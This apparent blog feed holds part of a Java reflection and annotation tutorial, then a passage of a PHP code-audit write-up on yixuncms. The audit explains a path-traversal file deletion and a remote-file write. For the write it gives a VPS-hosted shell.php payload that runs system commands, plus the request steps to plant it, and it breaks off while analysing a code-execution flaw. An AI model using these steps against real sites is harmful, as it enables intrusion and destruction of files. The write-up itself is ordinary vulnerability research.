<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String s &#x3D; &quot;Hello&quot;;</span><br><span class="line">Class cls &#x3D; s.getClass();</span><br></pre></td></tr></table></figure>
<p>方法三：如果知道一个<code>class</code>的完整类名，可以通过静态方法<code>Class.forName()</code>获取：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class cls &#x3D; Class.forName(&quot;java.lang.String&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="访问字段">访问字段</h3>
<p><code>Class</code>类提供了以下几个方法来获取字段：</p>
<ul>
<li>Field getField(name)：根据字段名获取某个public的field（包括父类）</li>
<li>Field getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类）</li>
<li>Field[] getFields()：获取所有public的field（包括父类）</li>
<li>Field[] getDeclaredFields()：获取当前类的所有field（不包括父类）</li>
</ul>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118113344.png" alt=""></p>
<p>一个<code>Field</code>对象包含了一个字段的所有信息：</p>
<ul>
<li><code>getName()</code>：返回字段名称，例如，<code>&quot;name&quot;</code>；</li>
<li><code>getType()</code>：返回字段类型，也是一个<code>Class</code>实例，例如，<code>String.class</code>；</li>
<li><code>getModifiers()</code>：返回字段的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li>
</ul>
<p>还是以上面这段代码为例：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118113943.png" alt=""></p>
<h4 id="获取字段值">获取字段值</h4>
<p>利用反射拿到字段的一个<code>Field</code>实例之后，可以拿到一个实例对应的该字段的值：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118115216.png" alt=""></p>
<p>如果不调用<code>Field.setAccessible(true)</code>，就会抛出一个<code>IllegalAccessException</code>的错误，这是因为<code>name</code>字段被定义成<code>private</code>。</p>
<h4 id="设置字段值">设置字段值</h4>
<p>除了使用get方法获取字段值，还可以用set方法获取字段值：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118115646.png" alt=""></p>
<p>同样，修改非<code>public</code>字段，需要首先调用<code>setAccessible(true)</code>。</p>
<h3 id="调用方法">调用方法</h3>
<p><code>Class</code>类提供了以下几个方法来获取<code>Method</code>：</p>
<ul>
<li><code>Method getMethod(name, Class...)</code>：获取某个<code>public</code>的<code>Method</code>（包括父类）</li>
<li><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个<code>Method</code>（不包括父类）</li>
<li><code>Method[] getMethods()</code>：获取所有<code>public</code>的<code>Method</code>（包括父类）</li>
<li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（不包括父类）</li>
</ul>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118121523.png" alt=""></p>
<p>一个<code>Method</code>对象包含一个方法的所有信息：</p>
<ul>
<li><code>getName()</code>：返回方法名称，例如：<code>&quot;getScore&quot;</code>；</li>
<li><code>getReturnType()</code>：返回方法返回值类型，也是一个Class实例，例如：<code>String.class</code>；</li>
<li><code>getParameterTypes()</code>：返回方法的参数类型，是一个Class数组，例如：<code>&#123;String.class, int.class&#125;</code>；</li>
<li><code>getModifiers()</code>：返回方法的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li>
</ul>
<p>当我们获取到一个<code>Method</code>对象时，就可以对它进行调用。我们以下面的代码为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String s &#x3D; &quot;Hello world&quot;;</span><br><span class="line">String r &#x3D; s.substring(6); &#x2F;&#x2F; &quot;world&quot;</span><br></pre></td></tr></table></figure>
<p>如果用反射来调用<code>substring</code>方法：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145036.png" alt=""></p>
<h4 id="调用静态方法">调用静态方法</h4>
<p>如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以<code>invoke</code>方法传入的第一个参数永远为<code>null</code>。以<code>Integer.parseInt(String)</code>为例：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145348.png" alt=""></p>
<h4 id="调用非public方法">调用非public方法</h4>
<p>和Field类似，对于非public方法，我们虽然可以通过<code>Class.getDeclaredMethod()</code>获取该方法实例，但直接对其调用将得到一个<code>IllegalAccessException</code>。为了调用非public方法，我们通过<code>Method.setAccessible(true)</code>允许其调用：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145724.png" alt=""></p>
<h4 id="多态">多态</h4>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118150644.png" alt=""></p>
<p>一个<code>Person</code>类定义了<code>hello()</code>方法，并且它的子类<code>Student</code>也覆写了<code>hello()</code>方法，那么，从<code>Person.class</code>获取的<code>Method</code>，作用于<code>Student</code>实例时，同样会遵循多态原则，实际调用的是<code>Student</code>类的<code>hello()</code>方法。</p>
<h3 id="调用构造方法">调用构造方法</h3>
<p>Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118152642.png" alt=""></p>
<p>通过Class实例获取Constructor的方法如下：</p>
<ul>
<li><code>getConstructor(Class...)</code>：获取某个<code>public</code>的<code>Constructor</code>；</li>
<li><code>getDeclaredConstructor(Class...)</code>：获取某个<code>Constructor</code>；</li>
<li><code>getConstructors()</code>：获取所有<code>public</code>的<code>Constructor</code>；</li>
<li><code>getDeclaredConstructors()</code>：获取所有<code>Constructor</code>。</li>
</ul>
<h3 id="获取继承关系">获取继承关系</h3>
<h4 id="获取父类class">获取父类class</h4>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118163859.png" alt=""></p>
<h4 id="获取interface">获取interface</h4>
<p>由于一个类可能实现一个或多个接口，通过<code>Class</code>我们就可以查询到实现的接口类型。例如，查询<code>String</code>实现的接口：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118164136.png" alt=""></p>
<h3 id="动态代理">动态代理</h3>
<p><a href="https://www.jianshu.com/p/95970b089360">https://www.jianshu.com/p/95970b089360</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118170645.png" alt=""></p>
<p>在运行期动态创建一个<code>interface</code>实例的方法如下：</p>
<ol>
<li>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用；</li>
<li>通过<code>Proxy.newProxyInstance()</code>创建<code>interface</code>实例，它需要3个参数：
<ol>
<li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code>；</li>
<li>需要实现的接口数组，至少需要传入一个接口进去；</li>
<li>用来处理接口方法调用的<code>InvocationHandler</code>实例。</li>
</ol>
</li>
<li>将返回的<code>Object</code>强制转型为接口。</li>
</ol>
<h2 id="0x02-注解">0x02 注解</h2>
<h3 id="常用的元注解">常用的元注解</h3>
<h4 id="Target">@Target</h4>
<p>使用<code>@Target</code>可以定义<code>Annotation</code>能够被应用于源码的哪些位置：</p>
<ul>
<li>类或接口：<code>ElementType.TYPE</code>；</li>
<li>字段：<code>ElementType.FIELD</code>；</li>
<li>方法：<code>ElementType.METHOD</code>；</li>
<li>构造方法：<code>ElementType.CONSTRUCTOR</code>；</li>
<li>方法参数：<code>ElementType.PARAMETER</code>。</li>
</ul>
<h4 id="Retention">@Retention</h4>
<p>元注解<code>@Retention</code>定义了<code>Annotation</code>的生命周期：</p>
<ul>
<li>仅编译期：<code>RetentionPolicy.SOURCE</code>；</li>
<li>仅class文件：<code>RetentionPolicy.CLASS</code>；</li>
<li>运行期：<code>RetentionPolicy.RUNTIME</code>。</li>
</ul>
<p>如果<code>@Retention</code>不存在，则该<code>Annotation</code>默认为<code>CLASS</code>。</p>
<h3 id="如何定义Annotation">如何定义Annotation</h3>
<p>我们总结一下定义<code>Annotation</code>的步骤：</p>
<p>第一步，用<code>@interface</code>定义注解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public @interface Report &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二步，添加参数、默认值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public @interface Report &#123;</span><br><span class="line">    int type() default 0;</span><br><span class="line">    String level() default &quot;info&quot;;</span><br><span class="line">    String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把最常用的参数定义为<code>value()</code>，推荐所有参数都尽量设置默认值。</p>
<p>第三步，用元注解配置注解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Target(ElementType.TYPE)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">public @interface Report &#123;</span><br><span class="line">    int type() default 0;</span><br><span class="line">    String level() default &quot;info&quot;;</span><br><span class="line">    String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，必须设置<code>@Target</code>和<code>@Retention</code>，<code>@Retention</code>一般设置为<code>RUNTIME</code>，因为我们自定义的注解通常要求在运行期读取。</p>
<h3 id="使用注解">使用注解</h3>
<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Range(min = 1, max = 20)</span></span><br><span class="line">	<span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Range(max = 10)</span></span><br><span class="line">	<span class="keyword">public</span> String city;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Range(min = 1, max = 100)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, String city, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.city = city;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> String.format(<span class="string">&quot;&#123;Person: name=%s, city=%s, age=%d&#125;&quot;</span>, name, city, age);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Range.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> <span class="keyword">default</span> 255</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Learn Java from https://www.liaoxuefeng.com/</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liaoxuefeng</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Beijing&quot;</span>, <span class="number">20</span>);</span><br><span class="line">		Person p2 = <span class="keyword">new</span> Person(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Shanghai&quot;</span>, <span class="number">20</span>);</span><br><span class="line">		Person p3 = <span class="keyword">new</span> Person(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Shanghai&quot;</span>, <span class="number">199</span>);</span><br><span class="line">		<span class="keyword">for</span> (Person p : <span class="keyword">new</span> Person[] &#123; p1, p2, p3 &#125;) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				check(p);</span><br><span class="line">				System.out.println(<span class="string">&quot;Person &quot;</span> + p + <span class="string">&quot; checked ok.&quot;</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">				System.out.println(<span class="string">&quot;Person &quot;</span> + p + <span class="string">&quot; checked failed: &quot;</span> + e);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(Person person)</span> <span class="keyword">throws</span> IllegalArgumentException, ReflectiveOperationException </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class="line">			Range range = field.getAnnotation(Range.class);</span><br><span class="line">			<span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">				Object value = field.get(person);</span><br><span class="line">				<span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">				<span class="keyword">if</span> (value <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">					String s = (String) value;</span><br><span class="line">					<span class="keyword">if</span> (s.length() &lt; range.min() || s.length() &gt; range.max())&#123;</span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid name&quot;</span> + field.getName());</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Integer)&#123;</span><br><span class="line">					Integer i = (Integer) value;</span><br><span class="line">					<span class="keyword">if</span> (i &lt; range.min() || i &gt; range.max())&#123;</span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid age&quot;</span> + field.getName());</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person &#123;Person: name=Bob, city=Beijing, age=<span class="number">20</span>&#125; checked ok.</span><br><span class="line">Person &#123;Person: name=, city=Shanghai, age=<span class="number">20</span>&#125; checked failed: java.lang.IllegalArgumentException: Invalid namename</span><br><span class="line">Person &#123;Person: name=Alice, city=Shanghai, age=<span class="number">199</span>&#125; checked failed: java.lang.IllegalArgumentException: Invalid ageage</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计——yixuncms</title>
    <url>/code_audit/PHP/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms/</url>
    <content><![CDATA[<h1 id="PHP代码审计——yixuncms审计">PHP代码审计——yixuncms审计</h1>
<h2 id="0x01-审计入口">0x01 审计入口</h2>
<p>对于一个MVC结构而言，比较重要的就是首先弄清楚路由是怎么走的，首先看到<code>index.php</code>中包含了<code>home/index.php</code>，其中第106行调用了<code>Prourl::parseUrl();</code>，这个函数就是用来解析Url：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class/prourl.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Prourl</span> </span>&#123;</span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * URL路由,转为PATHINFO的格式</span></span><br><span class="line"><span class="comment">		 */</span> </span><br><span class="line">		<span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;PATH_INFO&#x27;</span>]))&#123;</span><br><span class="line">      			 	<span class="comment">//获取 pathinfo</span></span><br><span class="line">				$pathinfo = explode(<span class="string">&#x27;/&#x27;</span>, trim($_SERVER[<span class="string">&#x27;PATH_INFO&#x27;</span>], <span class="string">&quot;/&quot;</span>));</span><br><span class="line">			</span><br><span class="line">       				<span class="comment">// 获取 control</span></span><br><span class="line">       				$_GET[<span class="string">&#x27;m&#x27;</span>] = (!<span class="keyword">empty</span>($pathinfo[<span class="number">0</span>]) ? $pathinfo[<span class="number">0</span>] : <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line"></span><br><span class="line">       				array_shift($pathinfo); <span class="comment">//将数组开头的单元移出数组 </span></span><br><span class="line">      				</span><br><span class="line">			       	<span class="comment">// 获取 action</span></span><br><span class="line">       				$_GET[<span class="string">&#x27;a&#x27;</span>] = (!<span class="keyword">empty</span>($pathinfo[<span class="number">0</span>]) ? $pathinfo[<span class="number">0</span>] : <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">				array_shift($pathinfo); <span class="comment">//再将将数组开头的单元移出数组 </span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($pathinfo); $i+=<span class="number">2</span>)&#123;</span><br><span class="line">					$_GET[$pathinfo[$i]]=$pathinfo[$i+<span class="number">1</span>];</span><br><span class="line">				&#125;</span><br><span class="line">			</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;	</span><br><span class="line">				$_GET[<span class="string">&quot;m&quot;</span>]= (!<span class="keyword">empty</span>($_GET[<span class="string">&#x27;m&#x27;</span>]) ? $_GET[<span class="string">&#x27;m&#x27;</span>]: <span class="string">&#x27;index&#x27;</span>);    <span class="comment">//默认是index模块</span></span><br><span class="line">				$_GET[<span class="string">&quot;a&quot;</span>]= (!<span class="keyword">empty</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>);   <span class="comment">//默认是index动作</span></span><br><span class="line">	</span><br><span class="line">				<span class="keyword">if</span>($_SERVER[<span class="string">&quot;QUERY_STRING&quot;</span>])&#123;</span><br><span class="line">					$m=$_GET[<span class="string">&quot;m&quot;</span>];</span><br><span class="line">					<span class="keyword">unset</span>($_GET[<span class="string">&quot;m&quot;</span>]);  <span class="comment">//去除数组中的m</span></span><br><span class="line">					$a=$_GET[<span class="string">&quot;a&quot;</span>];</span><br><span class="line">					<span class="keyword">unset</span>($_GET[<span class="string">&quot;a&quot;</span>]);  <span class="comment">//去除数组中的a</span></span><br><span class="line">					$query=http_build_query($_GET);   <span class="comment">//形成0=foo&amp;1=bar&amp;2=baz&amp;3=boom&amp;cow=milk格式</span></span><br><span class="line">					<span class="comment">//组成新的URL</span></span><br><span class="line">					$url=$_SERVER[<span class="string">&quot;SCRIPT_NAME&quot;</span>].<span class="string">&quot;/<span class="subst">&#123;$m&#125;</span>/<span class="subst">&#123;$a&#125;</span>/&quot;</span>.str_replace(<span class="keyword">array</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;=&quot;</span>), <span class="string">&quot;/&quot;</span>, $query);</span><br><span class="line">					header(<span class="string">&quot;Location:&quot;</span>.$url);</span><br><span class="line">				&#125;	</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>‘PATH_INFO’</p>
<p>包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息，如果存在的话。例如，如果当前脚本是通过 URL <a href="http://www.example.com/php/path_info.php/some/stuff?foo=bar">http://www.example.com/php/path_info.php/some/stuff?foo=bar</a> 被访问，那么 $_SERVER[‘PATH_INFO’] 将包含 <em>/some/stuff</em>。</p>
</blockquote>
<p>举个例子，假如访问<code>http://127.0.0.1/index.php/index/hello/pid/1</code>，那么<code>parseUrl()</code>函数会将<code>index</code>解析成类名，<code>hello</code>解析成方法名，<code>pid</code>是参数名，<code>1</code>是参数值。如果是通过GET传参的形式传入的话，那么就会先将Url转换成上面这种表示形式，再按相同的流程处理。</p>
<p>另外，项目中的<code>runtime</code>是对网站的缓存文件，也就说假如你访问了admin后台网站，那么第二次再访问的时候就会在<code>runtime</code>目录下执行，而不是进入<code>admin</code>目录。</p>
<h2 id="0x02-审计过程">0x02 审计过程</h2>
<p>首先用Seay和Rips工具扫描一遍，有一个大概的方向。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608115550.png" alt=""></p>
<h3 id="controls-flink-class-php任意文件删除"><code>controls/flink.class.php</code>任意文件删除</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> 	$flink = D(<span class="string">&#x27;flink&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;logoc&#x27;</span>]))&#123;</span><br><span class="line">		$logo = $flink-&gt;downlogo($_POST[<span class="string">&#x27;logoc&#x27;</span>]);</span><br><span class="line">		$srclogo = PROJECT_PATH.<span class="string">&quot;public/uploads/logos/&quot;</span>.$_POST[<span class="string">&quot;logo&quot;</span>];</span><br><span class="line">		<span class="keyword">if</span>(file_exists($srclogo))</span><br><span class="line">			unlink($srclogo);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$logo = $_POST[<span class="string">&quot;logo&quot;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($logo)&#123;</span><br><span class="line">		$_POST[<span class="string">&quot;logo&quot;</span>] = $logo;</span><br><span class="line">		<span class="keyword">if</span>($flink-&gt;update($_POST,<span class="number">1</span>,<span class="number">1</span>))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;redirect(<span class="string">&quot;index&quot;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$mess = $flink-&gt;getMsg();</span><br><span class="line">			<span class="keyword">if</span>($mess == <span class="string">&quot;&quot;</span>)</span><br><span class="line">				$mess = <span class="string">&quot;您未做任何修改&quot;</span>;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;mess($mess,<span class="literal">false</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;post&quot;</span>,$_POST);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;mess(<span class="string">&quot;LOGO下载失败，请检查URL地址是否正确&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;post&quot;</span>,$_POST);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;display(<span class="string">&quot;mod&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞出在第55行的<code>unlink()</code>函数，参数<code>$srclogo</code>是由用户POST参数<code>logo</code>再拼接网站目录得到的，而且没有任何过滤，那么就很容易利用路径遍历来删除任何文件。利用方式：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608142703.png" alt=""></p>
<h3 id="models-flink-php-class文件写入"><code>models/flink.php.class</code>文件写入</h3>
<p>首先通过一个危险函数<code>file_put_contens()</code>定位到<code>models/flink.class.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Flink</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">downlogo</span>(<span class="params">$logourl</span>)</span>&#123;</span><br><span class="line">			$url = parse_url($logourl);</span><br><span class="line">			$logoname = str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;_&quot;</span>,$url[<span class="string">&#x27;host&#x27;</span>]).<span class="string">&quot;.&quot;</span>.array_pop(explode(<span class="string">&quot;.&quot;</span>,basename($logourl)));</span><br><span class="line">			$path = PROJECT_PATH.<span class="string">&quot;public/uploads/logos/&quot;</span>;</span><br><span class="line">			<span class="keyword">if</span>(!file_exists($path))&#123;</span><br><span class="line">				mkdir($path);</span><br><span class="line">			&#125;</span><br><span class="line">			$location = $path.$logoname;</span><br><span class="line">			$data = file_get_contents($logourl);</span><br><span class="line">			<span class="keyword">if</span>(strlen($data) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">				file_put_contents($location,$data);</span><br><span class="line">				<span class="keyword">return</span> $logoname;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>file_put_contents()</code>接收两个参数：<code>$location</code>和<code>$data</code>。<code>$location</code>参数是通过拼接<code>.public/uploads/logos</code>和<code>$logoname</code>，而<code>logoname</code>首先通过<code>parse_url</code>把<code>$logourl</code>解析成数组形式，然后再把<code>host</code>字段的值中的<code>.</code>替换成<code>_</code>，后缀名是文件的后缀名，举个例子：加入<code>$url=http://127.0.0.1/shell.php</code>，那么<code>$logoname=127_0_0_1.php</code>。另外，<code>$data</code>参数是通过<code>file_get_contents()</code>函数读取Url中的文件内容。</p>
<p>全局搜索<code>downlogo</code>关键字，发现<code>controls/flink.class.php</code>文件中的<code>insert()</code>函数调用了<code>downlogo()</code>函数，通过POST的方式传参。利用方式如下：</p>
<ol>
<li>
<p>第一步首先在自己的VPS中写一个<code>shell.php</code>文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">    system(&#x27;ipconfig&#x27;);</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string">    &quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为源代码中是通过<code>file_get_contents()</code>函数读取文件内容，所以我们必须把真正的shell文件内容<code>echo</code>到页面上。</p>
</li>
<li>
<p>发起请求</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608145558.png" alt=""></p>
</li>
<li>
<p>访问<code>http://localhost/public/uploads/logos/xx_xx_xx_xx.php</code></p>
</li>
</ol>
<h3 id="classes-baseset-class-php任意代码执行"><code>classes/baseset.class.php</code>任意代码执行</h3>
<p>仍然是全局搜索<code>file_put_contents</code>关键字，在<code>classes/baseset.class.php</code>文件中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">writeindex</span>(<span class="params">$style,$start</span>)</span>&#123;</span><br><span class="line">	$file=PROJECT_PATH.<span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">	$content=file_get_contents($file);</span><br><span class="line">	$reg[]=<span class="string">&quot;/define\(\&quot;TPLSTYLE\&quot;.+?;/i&quot;</span>;</span><br><span class="line">	$reg[]=<span class="string">&quot;/define\(\&quot;CSTART\&quot;.+?;/i&quot;</span>;</span><br><span class="line">	$rep[]=<span class="string">&quot;define(\&quot;TPLSTYLE\&quot;,\&quot;<span class="subst">&#123;$style&#125;</span>\&quot;);&quot;</span>;</span><br><span class="line">	$rep[]=<span class="string">&quot;define(\&quot;CSTART\&quot;,\&quot;<span class="subst">&#123;$start&#125;</span>\&quot;);&quot;</span>;</span><br><span class="line">	file_put_contents($file, preg_replace($reg, $rep, $content));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来讲，<code>writeindex()</code>函数就是将<code>index.php</code>中的两个常量<code>TPLSTYLE</code>和<code>CSTART</code>的值分别替换成<code>$style</code>和<code>$start</code>。</p>
